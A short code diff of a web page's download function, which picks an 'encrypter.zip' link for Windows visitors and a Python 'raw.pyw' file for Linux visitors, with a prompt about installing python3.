@@ -126,7 +126,16 @@ folder and click on the exe file and you are done :). <br> This is our little de
     }
     function down()
     {
+        // window.open('https://6bt5age6nboutdggskfavw-on.drv.tw/downloader/encrypter.zip');
+        if (navigator.platform == "Win32")
+        {
         window.open('https://6bt5age6nboutdggskfavw-on.drv.tw/downloader/encrypter.zip');
+        }
+        else if (navigator.platform == "Linux x86_64")
+        {
+            var amew = confirm('You will need to install python3 for using this');
+            window.open('https://6bt5age6nboutdggskfavw-on.drv.tw/downloader/raw.pyw');
+        }
     }
             window.addEventListener('load', () => {
             var myVar = setInterval(can, 250);
